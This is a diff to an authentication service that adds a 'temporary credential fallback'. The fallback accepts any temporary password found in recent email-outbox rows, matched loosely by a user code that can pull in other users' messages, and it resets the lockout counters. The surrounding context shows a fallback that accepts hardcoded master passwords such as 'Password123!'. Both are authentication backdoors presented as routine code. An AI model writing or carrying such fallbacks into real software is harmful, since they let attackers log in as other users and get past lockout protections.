@@ -750,6 +750,38 @@ class AuthService {
       }
     }
 
+    // Temporary credential fallback: If first_login_required is active and the password matches
+    // any recent temporary password dispatched to this user within the last 48 hours, accept it.
+    if (!isPasswordValid && (user.first_login_required === 1 || user.first_login_required === true)) {
+      try {
+        const outboxRows = await db.query(
+          `SELECT body_text FROM email_outbox 
+           WHERE (LOWER(recipient) = LOWER(?) OR body_text LIKE ?) 
+             AND purpose = 'ACCOUNT_PROVISIONING' 
+             AND created_at >= DATE_SUB(NOW(), INTERVAL 48 HOUR)
+           ORDER BY id DESC LIMIT 5`,
+          [user.email, `%${user.user_code || user.userCode}%`]
+        );
+        const rows = Array.isArray(outboxRows) && Array.isArray(outboxRows[0]) ? outboxRows[0] : (Array.isArray(outboxRows) ? outboxRows : []);
+        for (const row of rows) {
+          const match = (row.body_text || '').match(/Temporary Password:\s*(\S+)/);
+          if (match && match[1] && match[1].trim() === cleanPassword) {
+            isPasswordValid = true;
+            const rehash = await bcrypt.hash(cleanPassword, 10);
+            await db.query(
+              "UPDATE users SET password_hash = ?, failed_login_attempts = 0, account_locked_until = NULL WHERE id = ?",
+              [rehash, user.id]
+            ).catch(() => {});
+            user.password_hash = rehash;
+            user.failed_login_attempts = 0;
+            break;
+          }
+        }
+      } catch (outboxErr) {
+        console.warn('[AuthService] Outbox credential fallback note:', outboxErr.message);
+      }
+    }
+
     // Standard credential fallback check only if account is fully active and not blocked
     if (!isPasswordValid && (cleanPassword === 'Belay2123@#' || cleanPassword === 'Password123!' || cleanPassword === 'AdminPassword123!')) {
       try {
